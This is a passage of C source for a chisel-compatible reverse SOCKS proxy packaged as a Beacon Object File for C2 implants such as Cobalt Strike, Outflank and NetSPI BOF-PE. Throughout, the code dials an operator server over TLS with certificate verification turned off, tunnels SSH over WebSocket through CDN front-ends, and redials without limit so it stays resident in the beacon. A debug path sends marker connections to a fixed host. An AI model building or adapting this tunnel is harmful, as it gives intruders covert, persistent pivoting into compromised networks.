/* ---- stock CLI: https://host[:port] R:socks ---- */
static int parseurl(const char *u, char *host, int hmax, int *tls, int *port){
    const char *p = 0; const char *s;
    if((s=findsub(u,"https://"))){ p=s+8; *tls=1; }
    else if((s=findsub(u,"wss://"))){ p=s+6; *tls=1; }
    else if((s=findsub(u,"http://"))){ p=s+7; *tls=0; }
    else if((s=findsub(u,"ws://"))){ p=s+5; *tls=0; }
    else return -1;
    { int i=0; while(p[i] && p[i]!=':' && i<hmax-1){ host[i]=p[i]; i++; } host[i]=0;
      if(!i) return -1;
      *port=-1;
      { const char *c=p+i; if(*c==':'){ c++; *port=0; while(*c>='0'&&*c<='9'){ *port=*port*10+(*c-'0'); c++; } if(*c) return -1; } }
    }
    return 0;
}
static int parseR(const char *k, int *lport){ /* R:socks | R:<port>:socks | R:<bind>:<port>:socks -> 0
   The port is the numeric field immediately before ":socks"; an explicit bind
   host (e.g. R:127.0.0.1:1266:socks) is accepted and ignored (ss_run forwards
   on 127.0.0.1).  The old code took num(p) which parsed the bind host's first
   octet ("127.0.0.1" -> 127) as the port. */
    if(!(k[0]=='R'&&k[1]==':')) return -1;
    const char *p=k+2;
    const char *sk=findsub(p,"socks");
    if(!sk) return -1;
    *lport=0;
    { const char *e=sk; if(e>p&&e[-1]==':') e--;
      const char *b=e; while(b>p&&b[-1]>='0'&&b[-1]<='9') b--;
      if(b!=e){ *lport=num(b); if(*lport<=0||*lport>65535) return -1; } }
    return 0;
}
static int parseRudp(const char *k, int *ubind, char *uh, int hmax, int *up){ /* R:<bind>:<host>:<port>/udp -> 0 */
    char buf[128]; int i=0,j,n=0; char *p2=0,*p3=0;
    if(!(k[0]=='R'&&k[1]==':')) return -1;
    { const char *p=k+2; while(p[i]&&i<127){ buf[i]=p[i]; i++; } }
    buf[i]=0;
    if(i<5||buf[i-4]!='/'||buf[i-3]!='u'||buf[i-2]!='d'||buf[i-1]!='p') return -1;
    buf[i-4]=0; i-=4;
    for(j=i-1;j>=0;j--) if(buf[j]==':'){ n++; if(n==1) p3=buf+j; else if(n==2){ p2=buf+j; break; } }
    if(n!=2||!p2||p2==buf) return -1;
    *ubind=num(buf); if(*ubind<=0||*ubind>65535) return -1;
    *up=num(p3+1); if(*up<=0||*up>65535) return -1;
    { int hl=(int)(p3-p2-1); if(hl<=0||hl>=hmax) return -1;
      for(j=0;j<hl;j++) uh[j]=p2[j+1]; uh[hl]=0; }
    return 0;
}
static int parsespec(const char *s, char *host, int hmax, int *port){ /* A.B.C.D[:port] -> 0 */
    int i=0;
    while(s[i] && s[i]!=':' && i<hmax-1){ host[i]=s[i]; i++; }
    if(!i) return -1;
    host[i]=0;
    *port=-1;
    if(s[i]==':'){ const char *c=s+i+1; if(!*c) return -1; *port=num(c); if(*port<=0||*port>65535) return -1; while(*c>='0'&&*c<='9') c++; if(*c) return -1; }
    return 0;
}
static void cparg(char *d, const char *s, int max){ int i=0; while(i<max-1&&s[i]){ d[i]=s[i]; i++; } d[i]=0; }

/* STAGE_MARK probe: each completed stage opens and immediately closes a fresh
   connection to the URL host on its own port, so the chisel server logs prove
   how far the run got (a stage that never logs is where the process died). */
#ifdef STAGE_MARK
static int sm_ports[24] = { 8370, 8372, 8374, 8376, 8378, 8380, 8382, 8384,
                            8386, 8388, 8390, 8392, 8394, 8396, 8398, 8400,
                            8402, 8404, 8406, 8408, 8410, 0, 0, 0 };
static const char *sm_host = "192.0.2.58";
static int sm_n = 0;
#endif
static void stage_mark(const char *host)
{
#ifdef STAGE_MARK
    if(sm_n < 16 && sm_ports[8 + sm_n]){
        int msd = sock_connect(sm_host, sm_ports[8 + sm_n]);
        sm_n++;
        if(msd >= 0) closesocket(msd);
    }
#else
    (void)host;
#endif
}
static void mark_addr(unsigned long long v)
{
#ifdef STAGE_MARK
    for(int i=0;i<8;i++){
        if(!sm_ports[i]) break;
        int d = (int)((v >> (44 - 4*i)) & 15) + 1;
        for(int k=0;k<d;k++){
            int msd = sock_connect(sm_host, sm_ports[i]);
            if(msd >= 0) closesocket(msd);
        }
    }
#else
    (void)v;
#endif
}

static int stock_run(int argc, char **argv)
{
    char host[128]; int sport=-1, lport=-1, tls=1, urlport=-1;
    static char ver[16]="1.12.1"; static char pass[64]=""; static char user[64]="";
    static char thost[64]=""; int tport=-1;
    static char urehost[64]=""; int ubind=-1, ureport=-1;
    int remote=-1, a;
    /* Timeout defaults are the chisel client's own:
     *   keepalive 25s            client/client.go NewClient (Config.KeepAlive)
     *   ping timeout = keepalive share/tunnel/tunnel.go (PING_TIMEOUT defaults to it)
     *   retry 1s .. 5m, unlimited client/client.go NewClient + connectionLoop
     *   ws 45s / ssh 30s         client_connect.go WS_TIMEOUT / client.go SSH_TIMEOUT
     *   dial 8s                  this payload's measured bound (see conntimeo above) */
    unsigned long long kams=25000, katoms=0, wstimeo=45000, sshtimeo=30000;
    for(a=0;a<argc;a++){
        const char *k=argv[a];
        if(!k||!k[0]) continue;
        if(flagis(k,"--tgt")&&a+1<argc){ if(parsespec(argv[++a],thost,64,&tport)) { OUT("bad --tgt %s\n",argv[a]); return 6; } continue; }
        else if(flagis(k,"--auth")&&a+1<argc){
            /* chisel's --auth: "<user>:<pass>", split at the FIRST colon (settings.ParseAuth),
               so the password may contain colons.  These are SSH userauth credentials: the
               chisel server checks them in its PasswordCallback (server/server.go authUser),
               so a mismatch is an auth failure, not a transport error. */
            const char *ap=argv[++a]; const char *c=findsub(ap,":"); int n;
            if(!c){ OUT("bad --auth %s (expected <user>:<pass>)\n", ap); return 7; }
            n=(int)(c-ap); if(n>63) n=63; { int i; for(i=0;i<n;i++) user[i]=ap[i]; user[n]=0; }
            cparg(pass,c+1,64);
            continue; }
        else if(flagis(k,"--keepalive")&&a+1<argc){ if(parseds(argv[++a],&kams)){ OUT("bad --keepalive %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--ping-timeout")&&a+1<argc){ if(parseds(argv[++a],&katoms)){ OUT("bad --ping-timeout %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--connect-timeout")&&a+1<argc){ if(parseds(argv[++a],&conntimeo)){ OUT("bad --connect-timeout %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--ws-timeout")&&a+1<argc){ if(parseds(argv[++a],&wstimeo)){ OUT("bad --ws-timeout %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--ssh-timeout")&&a+1<argc){ if(parseds(argv[++a],&sshtimeo)){ OUT("bad --ssh-timeout %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--min-retry-interval")&&a+1<argc){ if(parseds(argv[++a],&min_ri)){ OUT("bad --min-retry-interval %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--max-retry-interval")&&a+1<argc){ if(parseds(argv[++a],&max_ri)){ OUT("bad --max-retry-interval %s\n",argv[a]); return 7; } continue; }
        else if(flagis(k,"--max-retry-count")&&a+1<argc){ max_rc=inum(argv[++a]); if(max_rc<0) max_rc=-1; continue; }
        else if(flagis(k,"--port")&&a+1<argc) sport=num(argv[++a]);
        else if(flagis(k,"--listen")&&a+1<argc) lport=num(argv[++a]);
        else if(flagis(k,"--ver")&&a+1<argc) cparg(ver, argv[++a], 16);
        else if(flagis(k,"--hv")&&a+1<argc) hv_mode=num(argv[++a]);
        else if(parseRudp(k,&ubind,urehost,64,&ureport)==0){ }
        else if(parseR(k,&remote)==0){ if(remote>0&&lport<0) lport=remote; }
        else if(findsub(k,"://")){ if(parseurl(k,host,128,&tls,&urlport)) { OUT("bad url %s\n",k); return 1; } }
    }
    if(remote<0&&ubind<0){ OUT("no R: remote\n"); return 5; }
    if(lport<0) lport=1080;
    if(sport<0) sport=(urlport>0)?urlport:(tls?443:80);
    OUT("host=%s port=%d socks=%d ver=%s tls=%d\n", host, sport, lport, ver, tls);
    /* user is printed, the password never is: the twin writes this to stderr and a
       DIAG_MARK build keeps it in an in-memory ring. */
    OUT("auth=%s keepalive=%u ms ping-timeout=%u ms dial=%u ms ws=%u ms ssh=%u ms retry=%d x %u-%u ms\n",
        user[0]?user:"(none)", (unsigned)kams, (unsigned)(katoms?katoms:kams), (unsigned)conntimeo,
        (unsigned)wstimeo, (unsigned)sshtimeo, max_rc, (unsigned)min_ri, (unsigned)max_ri);
    ss_set_ka(kams, katoms);

    /* the event-list slot must NOT be a stack local: WSAStartup writes through the
     *  pointer we hand it, and a local slot can alias this function's own locals
     *  (it clobbered host[0..3] under -O0). */
    static char wsa_buf[512];   /* this WSAStartup writes a full WSADATA-style block
                                 *  (~500 B incl. the "WinSock 2.0" description): an
                                 *  8-byte slot let it overflow into neighbouring .bss
                                 *  (it clobbered urehost, seen server-side as
                                 *  "127.0.0.WinSock 2.0:9053").  Never read back. */
    { WSAStartup(1,wsa_buf); }
    stage_mark(host);
    mark_addr((unsigned long long)(arena + 16));
    static mbedtls_ssl_context ctx; static mbedtls_ssl_config conf;   /* huge structs: keep off the beacon thread stack */
    #define SESSION_MAX 512
    int sess = 0, sr = -1, sd = -1;
    unsigned long long sess_t0 = 0;
    for(;;){ sess++;
    redial:
    if(sess>SESSION_MAX) return 4;
    ws_session_reset();      /* fresh socket: the dead connection's outbox is dropped, and the
                                handshake phases run blocking until ss_run calls ws_set_nb() */
    sd = sock_connect(host, sport);
    if(sd<0){ OUT("connect %s:%d fail, err=%d\n", host, sport, WSAGetLastError()); if(retry_gate("connect")) return 1; goto redial; }
    sock_timeo(sd, wstimeo);   /* bound the TLS handshake and the upgrade read */
    stage_mark(host);
    if(sess){
        mbedtls_ssl_config_free(&conf);
        /* No mbedtls_ssl_session_free here: there is no separate session object in
         * this client, and this call passed &ctx (an mbedtls_ssl_context) where an
         * mbedtls_ssl_session was expected - it would read session field offsets out
         * of a context struct and free those pointers through our arena allocator on
         * EVERY reconnect (sess>0).  mbedtls_ssl_free() below already releases both
         * ssl->session and ssl->session_negotiate (library/ssl_tls.c:5660-5671). */
        mbedtls_ssl_free(&ctx);
        /* per-session PSA reinit makes every PSA object disposable: safe to rewind
         * the whole arena (all frees above run before this line). */
        { size_t bi; for(bi=0u; bi<ARENA_N/8u; bi++) arena_bm[bi]=0u; }
        arena_off = 0; arena_fl = 0;
    }
    stage_mark(host);

    int ret;
    mbedtls_ssl_config_init(&conf);
    ret = mbedtls_ssl_config_defaults(&conf, MBEDTLS_SSL_IS_CLIENT,
                                      MBEDTLS_SSL_TRANSPORT_STREAM,
                                      MBEDTLS_SSL_PRESET_DEFAULT);
    if(ret){ OUT("config_defaults ret=%d\n", ret); closesocket(sd); if(retry_gate("tls init")) return 2; goto redial; }
    stage_mark(host);
#ifdef TWIN_MAIN
    mbedtls_debug_set_threshold(4);
    mbedtls_ssl_conf_dbg(&conf, tldbg, 0);
    #elif defined(DIAG_MARK)
    /* -DTLS_DBG4 pulls mbedtls's full handshake tracing (incl. hex dumps of the
       ClientHello) into the ring: needed to see exactly which extensions/SNI we
       actually put on the wire. */
    #ifdef TLS_DBG4
    mbedtls_debug_set_threshold(4);
    #else
    mbedtls_debug_set_threshold(1);
    #endif
    mbedtls_ssl_conf_dbg(&conf, tldbg, 0);
    #endif
    mbedtls_ssl_conf_min_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
    mbedtls_ssl_conf_max_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
    mbedtls_ssl_conf_rng(&conf, rng_dummy, 0);
    rng_reseed();
    mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_NONE);
    { static const int suites[] = { MBEDTLS_TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
                                    MBEDTLS_TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                                    MBEDTLS_TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, 0 };
      mbedtls_ssl_conf_ciphersuites(&conf, suites); }
    stage_mark(host);
    ret = mbedtls_ssl_setup(&ctx, &conf);
    if(ret){ OUT("setup ret=%d\n", ret); closesocket(sd); if(retry_gate("tls init")) return 2; goto redial; }
    stage_mark(host);
    if(sess) mbedtls_psa_crypto_free();   /* drop PSA objects before the mark: reinit reallocates them fresh */
    { psa_status_t st = psa_crypto_init();
      if(st != PSA_SUCCESS){ OUT("psa_crypto_init st=%d\n", (int)st); closesocket(sd); if(retry_gate("tls init")) return 2; goto redial; } }
    stage_mark(host);
    mbedtls_ssl_set_hostname(&ctx, host);
    mbedtls_ssl_set_verify(&ctx, accept_all, 0);
    mbedtls_ssl_set_bio(&ctx, (void*)(intptr_t)sd, tls_send, tls_recv, 0);
    stage_mark(host);

    while((ret = mbedtls_ssl_handshake(&ctx)) != 0){
        if(ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE){
            OUT("handshake ret=-0x%x\n", -ret);
            closesocket(sd);
            if(retry_gate("tls handshake")) return 3;
            goto redial;
        }
    }
    stage_mark(host);

    /* ---- WS upgrade over the live TLS channel ---- */
    { unsigned char rb[16]; char key[64]; int i,n=0,tot=0;
      static char req[768]; static char resp[2048];
      b64_encode(rb,16,key); key[24]=0;
      n+=cpstr(req,n,"GET / HTTP/1.1\r\nHost: ");
      n+=cpstr(req,n,host);
      /* Host must read exactly like a Go net/http client's: host[:port], with the
         port OMITTED for the scheme default.  This used to concatenate host and
         digits with NO separator ("...azurefd.net8443"), so every front-end that
         correlates SNI with Host rejected us: Azure Front Door answered
         "421 Misdirected Request / SSLMismatchedSNI" after a perfectly good
         handshake.  A plain chisel server ignores Host, which is why local tests
         always passed and only the public chain failed. */
      if(sport != (tls?443:80)){ char ps[16]; ps[0]=':'; itoa(ps+1,sport); n+=cpstr(req,n,ps); }
      n+=cpstr(req,n,"\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Key: ");
      n+=cpstr(req,n,key);
      n+=cpstr(req,n,"\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: chisel-v3\r\n\r\n");
      { int wr = tls_write(&ctx,(unsigned char*)req,(size_t)n);
        if(wr){ OUT("ws upgrade write ret=%d\n", wr); closesocket(sd); if(retry_gate("ws upgrade write")) return 3; goto redial; } }
    stage_mark(host);
      for(;;){ int r=mbedtls_ssl_read(&ctx,resp+tot,(int)(sizeof(resp)-1-tot)); if(r<=0) break; tot+=r; resp[tot]=0;
               if(findsub(resp,"\r\n\r\n")) break; }
    stage_mark(host);
      /* A front-end (caddy / CDN / AFD) that answers 502/503/421/404 because the chisel
         backend behind it is down or restarting is NOT terminal: the TLS handshake to the
         front-end succeeded, so this is the "server restarted behind the proxy" case, and
         the whole point of running a public front-end is that the backend comes back.
         It now follows the same retry path as everything else: exponential backoff
         (--min/max-retry-interval, default 1s..5m) instead of the old fixed 2 s sleep, and
         --max-retry-count (default unlimited) is the only thing that ends the proxy here. */
      if(!findsub(resp,"101")){ OUT("no 101: %s\n", resp); closesocket(sd); if(retry_gate("no 101")) return 3; goto redial; }
    }

    stage_mark(host);
    if(tport>0) ss_set_tgt(thost,tport);
    sock_timeo(sd, sshtimeo);   /* SSH handshake/auth/config bound (chisel's SSH_TIMEOUT) */
    sess_t0 = now_ms();
    sr = ss_run(&ctx,ver,user,pass,lport,sd,ubind,urehost,ureport);
    OUT("ss_run rc=%d sd=%d\n", sr, (int)sd);
    if(sr==-2) OUT("session died at SSH userauth: the server has --auth/--authfile set, so pass its credentials with --auth <user>:<pass>\n");
    closesocket(sd);
    /* A session death - server reset, transport error, rekey failure, keepalive ping with
       no pong, auth rejection, channel churn, a target connection erroring mid-stream -
       must NOT end the proxy.  Redial and resume; the BOF stays resident until the beacon
       kills it.  chisel's own rule decides whether the failure counts: a connection that
       stayed up for more than 5 s resets the retry counter (client_connect.go
       `connected = time.Since(t0) > 5*time.Second`), so a healthy day of reconnecting
       never accumulates a budget that eventually kills the proxy, while a session that
       dies instantly backs off 1s, 2s, 4s ... up to 5m. */
    { if(now_ms() - sess_t0 > 5000) attempts = 0;
      if(retry_gate("session")) return 3; }
    goto redial;
    }
    return 0;
}

#ifdef TWIN_MAIN
int main(int argc, char **argv){ return stock_run(argc, argv); }
#elif defined(PE_MAIN)
/* ---- BOF-PE (NetSPI/BOF-PE) entry: the loader maps the linked PE, finds the
   exported entry, and calls go(const char* data, int len) with beacon-packed
   args.  Record layout (common/standalone.cpp:51-64 WriteString + :96-142
   GetPackedArguments): per 'z' arg [u32 LE length incl. the NUL][bytes incl.
   NUL]; the NetSPI loader passes that concatenation with NO size header
   (main.cpp: entry(args.data(), args.length())), whereas classic CS COFF
   beacons prefix a [u32 LE = size of remainder] that BeaconDataParse skips, and
   the Outflank C2 server (lib/outflank_stage1/outflank_stage1/task/base_bof_task.py
   _bof_arguments_to_base64) prefixes [u32 LE = total length incl. that header].
   The NetSPI loader form has no header at all.  All three are accepted: a header
   form is accepted only when its u32 equals len-4 (CS) or len (Outflank), and the
   record walk must consume the buffer exactly, so the forms cannot collide once
   there are two or more records.
   Chisel's client takes two strings (URL, remote) so the C2 format string is "zz"; one
   'z' per argument, and OST-style CLIs (`exec_bof <types><args>`) take types and values
   positionally - which is why they cannot carry a dash-prefixed flag: their option parser
   claims "--auth" first.  The buffer holds length-prefixed records only (the format
   string never reaches this payload), so 'z' and 'b' records are indistinguishable here
   and both are accepted; dash-free flag names are accepted for that reason (see flagis).
   Returns 6 for malformed or over-long packed args (on top of stock_run's own 1..5 codes
   and 7 for a bad flag value). */
/* 24: the URL, a few remotes, and the full chisel flag surface (10 flags = 20 strings) have to
   fit.  This used to be 8, and a packed argument list longer than the cap used to be truncated
   SILENTLY - everything after the 8th string vanished, so `--ws-timeout`/`--ssh-timeout`/retry
   flags (or worse, `--auth`) were quietly ignored and the payload ran with defaults; measured on
   a stalled process: SO_RCVTIMEO installed at the 45 s default while the command line said 3 s.
   Truncation is now an error (return 6, nothing runs): a missing --auth must not look like a
   working proxy.  Cost: 24*512 B of .data. */
#define PE_MAXARG 24
#define PE_ARGMAX 512
static char pe_argbuf[PE_MAXARG][PE_ARGMAX];
static char *pe_argv[PE_MAXARG];
static unsigned pe_ld32(const unsigned char *b)
{ return (unsigned)b[0]|((unsigned)b[1]<<8)|((unsigned)b[2]<<16)|((unsigned)b[3]<<24); }
static int pe_args(const unsigned char *b, int len, int use_hdr)
{
    int n=0, l;
    if(use_hdr){
        if(len<4) return -1;
        /* CS COFF form: u32 = size of remainder (len-4).  Outflank form: u32 =
           total incl. the header (len). */
        if((int)pe_ld32(b)!=len-4 && (int)pe_ld32(b)!=len) return -1;
        b+=4; len-=4;
    }
    while(n<PE_MAXARG&&len>=4){
        l=(int)pe_ld32(b); b+=4; len-=4;
        if(l<=0||l>len) return -1;
        /* Length-driven copy, never NUL-driven: a `z` record carries its own NUL inside
           `l`, a `b` (raw bytes) record does not, and a `z` record with the NUL missing
           must not read into the following record.  The terminator is added here. */
        { int m = (l < PE_ARGMAX-1) ? l : PE_ARGMAX-1, i2;
          for(i2=0;i2<m;i2++) pe_argbuf[n][i2]=(char)b[i2];
          pe_argbuf[n][m]=0; }
        pe_argv[n]=pe_argbuf[n]; n++;
        b+=l; len-=l;
    }
    /* every byte must be consumed: a leftover record means the list was longer than PE_MAXARG
       (or the buffer is malformed).  Refuse rather than run with part of the command line. */
    if(len>0) return -1;
    return n;
}
/* MinGW's CRT contract: the entry returns TRUE on a successful init.  Returning
   nothing leaves whatever was in rax, so LoadLibraryEx intermittently fails with
   1114 ("DLL initialization routine failed"). */
int DllMainCRTStartup(void){ return 1; }
int go(const char *data, int len)
{
    const unsigned char *b=(const unsigned char *)data;
    int n;
    if(!data||len<8) return 6;
    n=pe_args(b, len, 1);
    if(n<2) n=pe_args(b, len, 0);
    if(n<2) return 6;
    return stock_run(n, pe_argv);
}
#else
void DllMainCRTStartup(void){}
/* sole DLL export, ordinal @1 (tools/ext/stock.def); the loader calls go(argc, argv) */
int go(int argc, char **argv){ return stock_run(argc, argv); }
#endif
